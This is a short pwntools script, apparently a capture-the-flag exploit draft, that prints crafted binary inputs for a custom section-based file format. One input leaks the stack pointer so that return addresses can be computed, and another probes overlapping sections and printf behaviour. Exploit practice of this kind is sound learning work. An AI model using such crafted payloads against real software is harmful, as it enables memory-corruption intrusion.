#! /bin/python

from pwn import *
#print p32(0x65736264)+'\x01'+p32(0x100)+p8(0x1)+'a'*31+p8(0)+p32(0x0)+p32(0x10)+'\n'
#dump stack pointer, we can calculate main ebp/ret and so on
print (p32(0x65736264)+'\x01'+p32(0x100)+
       p8(0x1)+                           #section number, same as line below
       'a'*31+p8(0x0)+p32(0x426-0x30)+p32(0x8)+  #40byte, idx offset / counter
       '\n')
#test multiple section and printf, here is 4
print (p32(0x65736264)+'\x01'+p32(0x100)+
       p8(0x4)+                           #section number, same as line below
       'a'*31+p8(0x0)+p32(0x0)+p32(0x10)+ #40byte, idx offset / counter
       'b'*29+p8(0x0)+p32(0x2)+p32(0x5)+  #38byte, 2byte overlap
       'c'*29+p8(0x0)+p32(0x2)+p32(0x8)+  #38byte, 2byte overlap
       'd'*29+p8(0x0)+p32(0x2)+p32(0x6)+  #38byte, 2byte overlap
       '\n')
